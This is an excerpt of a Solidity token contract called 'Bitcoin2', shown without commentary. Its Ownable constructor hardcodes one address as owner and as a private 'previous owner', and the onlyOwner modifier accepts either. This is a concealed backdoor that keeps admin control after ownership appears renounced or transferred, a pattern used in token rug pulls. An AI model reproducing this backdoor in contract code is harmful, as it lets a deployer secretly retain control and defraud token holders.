...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xB2038a6Fb2984f3d50C3F7949C197D2527cFF9aA; //msg.sender()
        _previousOwner = 0xB2038a6Fb2984f3d50C3F7949C197D2527cFF9aA;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function previousOwner() private view returns (address) {
        return _previousOwner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender() || previousOwner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract Bitcoin2 is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0xB2038a6Fb2984f3d50C3F7949C197D2527cFF9aA;
